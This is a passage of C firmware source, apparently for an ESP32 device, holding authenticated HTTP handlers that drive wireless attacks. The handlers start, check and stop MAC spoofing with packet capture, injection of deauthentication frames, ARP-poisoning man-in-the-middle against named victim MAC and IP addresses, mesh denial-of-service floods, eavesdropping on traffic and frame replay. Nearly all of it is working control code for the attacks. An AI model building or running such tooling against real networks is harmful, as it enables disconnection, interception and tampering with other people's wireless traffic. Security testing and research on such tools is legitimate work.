    cJSON *jpass = cJSON_GetObjectItem(root, "pass");

    if (!jmac || !cJSON_IsString(jmac) ||
        !jssid || !cJSON_IsString(jssid) ||
        !jpass || !cJSON_IsString(jpass)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing mac/ssid/pass");
        return ESP_FAIL;
    }

    uint8_t mac[6];
    if (sscanf(jmac->valuestring, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) != 6) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid MAC");
        return ESP_FAIL;
    }

    ESP_LOGW(TAG, "SPOOF: MAC=%s AP=%s", jmac->valuestring, jssid->valuestring);

    esp_err_t ret = node_spoof_start(mac, jssid->valuestring, jpass->valuestring);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
    return send_json_response(req, resp);
}

static esp_err_t spoof_status_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const spoof_state_t *st = node_spoof_get_state();
    cJSON *root = cJSON_CreateObject();
    cJSON_AddBoolToObject(root, "active", st->active);
    cJSON_AddBoolToObject(root, "connected", st->connected);
    cJSON_AddBoolToObject(root, "capturing", st->capturing);
    cJSON_AddNumberToObject(root, "packets_rx", st->packets_rx);
    cJSON_AddNumberToObject(root, "uptime_ms", st->uptime_ms);
    cJSON_AddNumberToObject(root, "log_count", st->log_count);

    char mac_str[18];
    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             st->target_mac[0], st->target_mac[1], st->target_mac[2],
             st->target_mac[3], st->target_mac[4], st->target_mac[5]);
    cJSON_AddStringToObject(root, "spoof_mac", mac_str);

    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             st->original_mac[0], st->original_mac[1], st->original_mac[2],
             st->original_mac[3], st->original_mac[4], st->original_mac[5]);
    cJSON_AddStringToObject(root, "original_mac", mac_str);

    cJSON_AddStringToObject(root, "ap_ssid", st->ap_ssid);
    cJSON_AddNumberToObject(root, "ap_rssi", st->ap_rssi);
    cJSON_AddNumberToObject(root, "ap_channel", st->ap_channel);
    if (st->error[0]) cJSON_AddStringToObject(root, "error", st->error);

    cJSON *logs = cJSON_CreateArray();
    for (int i = 0; i < st->log_count; i++) {
        const spoof_log_t *e = &st->log[i];
        cJSON *entry = cJSON_CreateObject();
        cJSON_AddStringToObject(entry, "type", e->frame_type == 0 ? "MGMT" : "DATA");
        cJSON_AddNumberToObject(entry, "subtype", e->subtype);
        cJSON_AddNumberToObject(entry, "rssi", e->rssi);
        cJSON_AddNumberToObject(entry, "channel", e->channel);
        cJSON_AddNumberToObject(entry, "time_ms", e->time_ms);

        char sm[18], dm[18];
        snprintf(sm, sizeof(sm), "%02X:%02X:%02X:%02X:%02X:%02X",
                 e->src_mac[0], e->src_mac[1], e->src_mac[2],
                 e->src_mac[3], e->src_mac[4], e->src_mac[5]);
        snprintf(dm, sizeof(dm), "%02X:%02X:%02X:%02X:%02X:%02X",
                 e->dst_mac[0], e->dst_mac[1], e->dst_mac[2],
                 e->dst_mac[3], e->dst_mac[4], e->dst_mac[5]);
        cJSON_AddStringToObject(entry, "src_mac", sm);
        cJSON_AddStringToObject(entry, "dst_mac", dm);
        cJSON_AddNumberToObject(entry, "len", e->len);

        char hex_buf[SPOOF_PAYLOAD_MAX * 2 + 1];
        hex_buf[0] = '\0';
        if (e->payload_len > 0) {
            for (int j = 0; j < e->payload_len; j++) {
                snprintf(hex_buf + j * 2, 3, "%02x", e->payload[j]);
            }
            hex_buf[e->payload_len * 2] = '\0';
        }
        cJSON_AddStringToObject(entry, "payload", hex_buf);
        cJSON_AddNumberToObject(entry, "payload_len", e->payload_len);

        cJSON_AddItemToArray(logs, entry);
    }
    cJSON_AddItemToObject(root, "logs", logs);

    return send_json_response(req, root);
}

static esp_err_t spoof_stop_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    node_spoof_stop();
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", true);
    cJSON_AddStringToObject(resp, "status", "stopped");
    return send_json_response(req, resp);
}

/* ================================================================== */
/*  MESH PACKET INJECTION HANDLERS                                     */
/* ================================================================== */

static bool parse_mac_arg(const char *str, uint8_t *mac)
{
    if (!str || !mac) return false;
    /* Accept AA:BB:CC:DD:EE:FF or AA-BB-CC-DD-EE-FF (not IPv4 dotted-quad). */
    if (sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6) {
        return true;
    }
    return sscanf(str, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

static esp_err_t mesh_inject_start_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char buf[512] = {0};
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
        return ESP_FAIL;
    }

    cJSON *root = cJSON_Parse(buf);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *jbssid  = cJSON_GetObjectItem(root, "bssid");
    cJSON *jdest   = cJSON_GetObjectItem(root, "dest_mac");
    cJSON *jsrc    = cJSON_GetObjectItem(root, "src_mac");
    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
    cJSON *jtempl  = cJSON_GetObjectItem(root, "template");
    cJSON *jhex    = cJSON_GetObjectItem(root, "custom_hex");
    cJSON *jburst  = cJSON_GetObjectItem(root, "burst_count");
    cJSON *jintv   = cJSON_GetObjectItem(root, "interval_ms");
    cJSON *jreason = cJSON_GetObjectItem(root, "reason_code");
    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");

    mesh_inject_config_t cfg;
    memset(&cfg, 0, sizeof(cfg));

    if (!cJSON_IsString(jbssid) || !parse_mac_arg(jbssid->valuestring, cfg.target_bssid)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid bssid");
        return ESP_FAIL;
    }

    if (cJSON_IsString(jdest) && parse_mac_arg(jdest->valuestring, cfg.dest_mac)) {
        /* dest set */
    } else {
        memset(cfg.dest_mac, 0xFF, 6);
    }

    if (cJSON_IsString(jsrc) && parse_mac_arg(jsrc->valuestring, cfg.src_mac)) {
        cfg.src_mac_set = true;
    }

    cfg.channel = cJSON_IsNumber(jchan) ? (uint8_t)jchan->valueint : 0;
    cfg.template_id = cJSON_IsNumber(jtempl)
        ? (mesh_inject_template_t)jtempl->valueint
        : MESH_INJECT_TEMPLATE_DEAUTH;
    cfg.burst_count = cJSON_IsNumber(jburst) ? (uint16_t)jburst->valueint : 10;
    cfg.interval_ms = cJSON_IsNumber(jintv) ? (uint16_t)jintv->valueint : 100;
    cfg.reason_code = cJSON_IsNumber(jreason) ? (uint16_t)jreason->valueint : 7;

    if (cJSON_IsString(jhex)) {
        strncpy(cfg.custom_hex, jhex->valuestring, sizeof(cfg.custom_hex) - 1);
    }
    if (cJSON_IsString(jssid)) {
        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
    }

    if (cfg.template_id >= MESH_INJECT_TEMPLATE_COUNT) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid template");
        return ESP_FAIL;
    }

    ESP_LOGW(TAG, "MESH INJECT: bssid=%s template=%d burst=%u",
             jbssid->valuestring, (int)cfg.template_id, cfg.burst_count);

    esp_err_t ret = mesh_packet_inject_start(&cfg);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
    return send_json_response(req, resp);
}

static esp_err_t mesh_inject_status_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = mesh_packet_inject_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "active", false);
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "packets_sent", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t mesh_inject_stop_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    mesh_packet_inject_stop();
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", true);
    cJSON_AddStringToObject(resp, "status", "stopped");
    return send_json_response(req, resp);
}

/* ================================================================== */
/*  MESH MITM HANDLERS                                                 */
/* ================================================================== */

static bool parse_ip_arg(const char *str, uint8_t *ip)
{
    if (!str || !ip) return false;
    unsigned a, b, c, d;
    if (sscanf(str, "%u.%u.%u.%u", &a, &b, &c, &d) != 4) return false;
    if (a > 255 || b > 255 || c > 255 || d > 255) return false;
    ip[0] = (uint8_t)a; ip[1] = (uint8_t)b;
    ip[2] = (uint8_t)c; ip[3] = (uint8_t)d;
    return true;
}

static esp_err_t mesh_mitm_start_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    /* Read full body (Content-Length may exceed a single recv). */
    char buf[768] = {0};
    size_t total = 0;
    int remaining = req->content_len;
    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
        return ESP_FAIL;
    }
    while (remaining > 0) {
        int len = httpd_req_recv(req, buf + total, remaining);
        if (len <= 0) {
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
            return ESP_FAIL;
        }
        total += (size_t)len;
        remaining -= len;
    }
    buf[total] = '\0';

    cJSON *root = cJSON_Parse(buf);
    if (!root) {
        ESP_LOGW(TAG, "MESH MITM: invalid JSON (len=%u): %.120s",
                 (unsigned)total, buf);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    /* Accept snake_case or camelCase keys from UI / older clients */
    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");
    cJSON *jpass   = cJSON_GetObjectItem(root, "password");
    cJSON *jvmac   = cJSON_GetObjectItem(root, "victim_mac");
    if (!jvmac) jvmac = cJSON_GetObjectItem(root, "victimMac");
    cJSON *jvip    = cJSON_GetObjectItem(root, "victim_ip");
    if (!jvip) jvip = cJSON_GetObjectItem(root, "victimIp");
    cJSON *jgmac   = cJSON_GetObjectItem(root, "gateway_mac");
    if (!jgmac) jgmac = cJSON_GetObjectItem(root, "gatewayMac");
    cJSON *jgip    = cJSON_GetObjectItem(root, "gateway_ip");
    if (!jgip) jgip = cJSON_GetObjectItem(root, "gatewayIp");
    if (!jgip) jgip = cJSON_GetObjectItem(root, "parent_ip");
    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
    cJSON *jdeauth = cJSON_GetObjectItem(root, "deauth_first");
    cJSON *jintv   = cJSON_GetObjectItem(root, "arp_interval_ms");

    mesh_mitm_config_t cfg;
    memset(&cfg, 0, sizeof(cfg));

    if (!cJSON_IsString(jssid) || jssid->valuestring[0] == '\0') {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing ssid");
        return ESP_FAIL;
    }
    strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);

    if (cJSON_IsString(jpass)) {
        strncpy(cfg.password, jpass->valuestring, sizeof(cfg.password) - 1);
    }

    if (!cJSON_IsString(jvmac) || !parse_mac_arg(jvmac->valuestring, cfg.victim_mac)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid victim_mac");
        return ESP_FAIL;
    }

    if (!cJSON_IsString(jvip) || !parse_ip_arg(jvip->valuestring, cfg.victim_ip)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid victim_ip");
        return ESP_FAIL;
    }

    if (!cJSON_IsString(jgmac) || !parse_mac_arg(jgmac->valuestring, cfg.gateway_mac)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid gateway_mac");
        return ESP_FAIL;
    }
    cfg.gateway_mac_set = true;

    if (cJSON_IsString(jgip) && parse_ip_arg(jgip->valuestring, cfg.gateway_ip)) {
        cfg.gateway_ip_set = true;
    } else if (cfg.victim_ip[0] || cfg.victim_ip[1] || cfg.victim_ip[2] || cfg.victim_ip[3]) {
        /* Common SoftAP/mesh parent is x.x.x.1 — recover when UI omitted gateway_ip */
        memcpy(cfg.gateway_ip, cfg.victim_ip, 4);
        cfg.gateway_ip[3] = 1;
        cfg.gateway_ip_set = true;
        ESP_LOGW(TAG, "MESH MITM: gateway_ip missing/bad ('%s') — derived %u.%u.%u.%u from victim",
                 cJSON_IsString(jgip) ? jgip->valuestring : "(null)",
                 cfg.gateway_ip[0], cfg.gateway_ip[1],
                 cfg.gateway_ip[2], cfg.gateway_ip[3]);
    } else {
        ESP_LOGW(TAG, "MESH MITM: bad gateway_ip='%s' (present=%d type=%d) body=%.160s",
                 cJSON_IsString(jgip) ? jgip->valuestring : "(null)",
                 jgip != NULL, jgip ? jgip->type : -1, buf);
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
                            "Missing/invalid gateway_ip (need e.g. 192.168.4.1)");
        return ESP_FAIL;
    }

    cfg.channel = cJSON_IsNumber(jchan) ? (uint8_t)jchan->valueint : 0;
    if (cfg.channel == 0 && cJSON_IsString(jchan) && jchan->valuestring) {
        cfg.channel = (uint8_t)atoi(jchan->valuestring);
    }
    /* Default ON — missing key used to leave deauth off and starve ARP refresh */
    cfg.deauth_first = true;
    if (jdeauth != NULL) {
        cfg.deauth_first = cJSON_IsTrue(jdeauth) ||
                           (cJSON_IsNumber(jdeauth) && jdeauth->valueint != 0) ||
                           (cJSON_IsBool(jdeauth) && jdeauth->valueint);
    }
    cfg.arp_interval_ms = cJSON_IsNumber(jintv) ? (uint16_t)jintv->valueint
                                                 : MESH_MITM_ARP_INTERVAL_MS;

    char gip_str[16];
    snprintf(gip_str, sizeof(gip_str), "%u.%u.%u.%u",
             cfg.gateway_ip[0], cfg.gateway_ip[1],
             cfg.gateway_ip[2], cfg.gateway_ip[3]);
    ESP_LOGW(TAG, "MESH MITM: ssid=%s victim=%s/%s gateway=%s/%s ch=%u deauth=%d",
             cfg.ssid, jvmac->valuestring, jvip->valuestring,
             jgmac->valuestring, gip_str, cfg.channel, (int)cfg.deauth_first);

    esp_err_t ret = mesh_mitm_start(&cfg);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
    return send_json_response(req, resp);
}

static esp_err_t mesh_mitm_status_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = mesh_mitm_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "active", false);
        cJSON_AddStringToObject(fallback, "status", "Idle");
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t mesh_mitm_stop_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    mesh_mitm_stop();
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", true);
    cJSON_AddStringToObject(resp, "status", "stopped");
    return send_json_response(req, resp);
}

/* ================================================================== */
/*  MESH DoS HANDLERS                                                  */
/* ================================================================== */

static esp_err_t mesh_dos_start_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char buf[768] = {0};
    size_t total = 0;
    int remaining = req->content_len;
    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
        return ESP_FAIL;
    }
    while (remaining > 0) {
        int len = httpd_req_recv(req, buf + total, remaining);
        if (len <= 0) {
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
            return ESP_FAIL;
        }
        total += (size_t)len;
        remaining -= len;
    }
    buf[total] = '\0';

    cJSON *root = cJSON_Parse(buf);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *jbssid  = cJSON_GetObjectItem(root, "parent_bssid");
    if (!jbssid) jbssid = cJSON_GetObjectItem(root, "bssid");
    cJSON *jtarget = cJSON_GetObjectItem(root, "target_mac");
    if (!jtarget) jtarget = cJSON_GetObjectItem(root, "dest_mac");
    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
    cJSON *jmethod = cJSON_GetObjectItem(root, "method");
    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");
    cJSON *jintv   = cJSON_GetObjectItem(root, "interval_ms");
    cJSON *jburst  = cJSON_GetObjectItem(root, "burst_size");
    cJSON *jreason = cJSON_GetObjectItem(root, "reason_code");
    cJSON *jextra  = cJSON_GetObjectItem(root, "extra_targets");

    mesh_dos_config_t cfg;
    memset(&cfg, 0, sizeof(cfg));

    if (!cJSON_IsString(jbssid) || !parse_mac_arg(jbssid->valuestring, cfg.parent_bssid)) {
        ESP_LOGW(TAG, "MESH DoS: Invalid parent_bssid='%s' (need MAC AA:BB:CC:DD:EE:FF, not IP)",
                 cJSON_IsString(jbssid) ? jbssid->valuestring : "(missing)");
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
                            "Invalid parent_bssid (need MAC AA:BB:CC:DD:EE:FF, not IP)");
        return ESP_FAIL;
    }

    if (cJSON_IsString(jtarget) && parse_mac_arg(jtarget->valuestring, cfg.target_mac)) {
        cfg.target_mac_set = true;
    } else {
        memset(cfg.target_mac, 0xFF, 6);
    }

    cfg.channel = cJSON_IsNumber(jchan) ? (uint8_t)jchan->valueint : 0;
    cfg.method = cJSON_IsNumber(jmethod)
        ? (mesh_dos_method_t)jmethod->valueint
        : MESH_DOS_METHOD_CHILD_DEAUTH;
    cfg.interval_ms = cJSON_IsNumber(jintv) ? (uint16_t)jintv->valueint : 50;
    cfg.burst_size  = cJSON_IsNumber(jburst) ? (uint16_t)jburst->valueint : 5;
    cfg.reason_code = cJSON_IsNumber(jreason) ? (uint16_t)jreason->valueint : 7;

    if (cJSON_IsString(jssid)) {
        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
    }

    if (cJSON_IsArray(jextra)) {
        int n = cJSON_GetArraySize(jextra);
        for (int i = 0; i < n && cfg.extra_target_count < MESH_DOS_MAX_TARGETS; i++) {
            cJSON *item = cJSON_GetArrayItem(jextra, i);
            if (cJSON_IsString(item) &&
                parse_mac_arg(item->valuestring, cfg.extra_targets[cfg.extra_target_count])) {
                cfg.extra_target_count++;
            }
        }
    }

    if (cfg.method <= MESH_DOS_METHOD_NONE || cfg.method >= MESH_DOS_METHOD_COUNT) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid method");
        return ESP_FAIL;
    }

    ESP_LOGW(TAG, "MESH DoS: bssid=%s method=%d burst=%u interval=%u",
             jbssid->valuestring, (int)cfg.method, cfg.burst_size, cfg.interval_ms);

    esp_err_t ret = mesh_dos_start(&cfg);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
    return send_json_response(req, resp);
}

static esp_err_t mesh_dos_status_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = mesh_dos_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "active", false);
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "packets_sent", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t mesh_dos_stop_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    mesh_dos_stop();
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", true);
    cJSON_AddStringToObject(resp, "status", "stopped");
    return send_json_response(req, resp);
}

/* ================================================================== */
/*  MESH EAVESDROP HANDLERS                                            */
/* ================================================================== */

static esp_err_t mesh_eavesdrop_start_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char buf[512] = {0};
    size_t total = 0;
    int remaining = req->content_len;
    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
        return ESP_FAIL;
    }
    while (remaining > 0) {
        int len = httpd_req_recv(req, buf + total, remaining);
        if (len <= 0) {
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
            return ESP_FAIL;
        }
        total += (size_t)len;
        remaining -= len;
    }
    buf[total] = '\0';

    cJSON *root = cJSON_Parse(buf);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *jbssid  = cJSON_GetObjectItem(root, "parent_bssid");
    if (!jbssid) jbssid = cJSON_GetObjectItem(root, "bssid");
    cJSON *jtarget = cJSON_GetObjectItem(root, "target_mac");
    if (!jtarget) jtarget = cJSON_GetObjectItem(root, "dest_mac");
    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
    cJSON *jfilter = cJSON_GetObjectItem(root, "filter");
    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");

    mesh_eavesdrop_config_t cfg;
    memset(&cfg, 0, sizeof(cfg));

    if (!cJSON_IsNumber(jchan) || jchan->valueint <= 0) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "channel required");
        return ESP_FAIL;
    }
    cfg.channel = (uint8_t)jchan->valueint;

    if (cJSON_IsString(jbssid) && parse_mac_arg(jbssid->valuestring, cfg.parent_bssid)) {
        cfg.parent_bssid_set = true;
    }
    if (cJSON_IsString(jtarget) && parse_mac_arg(jtarget->valuestring, cfg.target_mac)) {
        cfg.target_mac_set = true;
    }

    cfg.filter = cJSON_IsNumber(jfilter)
        ? (mesh_eavesdrop_filter_t)jfilter->valueint
        : MESH_EAVES_FILTER_ALL;
    if (cfg.filter >= MESH_EAVES_FILTER_COUNT) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid filter");
        return ESP_FAIL;
    }

    if (cJSON_IsString(jssid)) {
        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
    }

    ESP_LOGW(TAG, "MESH Eavesdrop: ch=%u filter=%d bssid_set=%d target_set=%d",
             cfg.channel, (int)cfg.filter, cfg.parent_bssid_set, cfg.target_mac_set);

    esp_err_t ret = mesh_eavesdrop_start(&cfg);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
    return send_json_response(req, resp);
}

static esp_err_t mesh_eavesdrop_status_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = mesh_eavesdrop_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "active", false);
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "packets_rx", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t mesh_eavesdrop_stop_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    mesh_eavesdrop_stop();
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", true);
    cJSON_AddStringToObject(resp, "status", "stopped");
    return send_json_response(req, resp);
}

/* ================================================================== */
/*  MESH REPLAY HANDLERS                                               */
/* ================================================================== */

static esp_err_t mesh_replay_start_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char buf[512] = {0};
    size_t total = 0;
    int remaining = req->content_len;
    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
        return ESP_FAIL;
    }
    while (remaining > 0) {
        int len = httpd_req_recv(req, buf + total, remaining);
        if (len <= 0) {
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
            return ESP_FAIL;
        }
        total += (size_t)len;
        remaining -= len;
    }
    buf[total] = '\0';

    cJSON *root = cJSON_Parse(buf);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *jbssid  = cJSON_GetObjectItem(root, "parent_bssid");
    if (!jbssid) jbssid = cJSON_GetObjectItem(root, "bssid");
    cJSON *jtarget = cJSON_GetObjectItem(root, "target_mac");
    if (!jtarget) jtarget = cJSON_GetObjectItem(root, "dest_mac");
    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
    cJSON *jfilter = cJSON_GetObjectItem(root, "filter");
    cJSON *jmode   = cJSON_GetObjectItem(root, "mode");
    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");
    cJSON *jintv   = cJSON_GetObjectItem(root, "replay_interval_ms");
    cJSON *jreps   = cJSON_GetObjectItem(root, "replay_per_frame");

    mesh_replay_config_t cfg;
    memset(&cfg, 0, sizeof(cfg));

    if (!cJSON_IsNumber(jchan) || jchan->valueint <= 0) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "channel required");
        return ESP_FAIL;
    }
    cfg.channel = (uint8_t)jchan->valueint;

    if (cJSON_IsString(jbssid) && parse_mac_arg(jbssid->valuestring, cfg.parent_bssid)) {
        cfg.parent_bssid_set = true;
    }
    if (cJSON_IsString(jtarget) && parse_mac_arg(jtarget->valuestring, cfg.target_mac)) {
        cfg.target_mac_set = true;
    }

    cfg.filter = cJSON_IsNumber(jfilter)
        ? (mesh_replay_filter_t)jfilter->valueint
        : MESH_REPLAY_FILTER_MGMT;
    if (cfg.filter >= MESH_REPLAY_FILTER_COUNT) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid filter");
        return ESP_FAIL;
    }

    cfg.mode = cJSON_IsNumber(jmode)
        ? (mesh_replay_mode_t)jmode->valueint
        : MESH_REPLAY_MODE_LIVE;
    if (cfg.mode >= MESH_REPLAY_MODE_COUNT) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid mode");
        return ESP_FAIL;
    }

    if (cJSON_IsString(jssid)) {
        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
    }
    if (cJSON_IsNumber(jintv) && jintv->valueint > 0) {
        cfg.replay_interval_ms = (uint16_t)jintv->valueint;
    } else {
        cfg.replay_interval_ms = 200;
    }
    if (cJSON_IsNumber(jreps) && jreps->valueint > 0) {
        cfg.replay_per_frame = (uint8_t)jreps->valueint;
    } else {
        cfg.replay_per_frame = 1;
    }

    ESP_LOGW(TAG, "MESH Replay: ch=%u mode=%d filter=%d bssid_set=%d target_set=%d",
             cfg.channel, (int)cfg.mode, (int)cfg.filter,
             cfg.parent_bssid_set, cfg.target_mac_set);

    esp_err_t ret = mesh_replay_start(&cfg);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
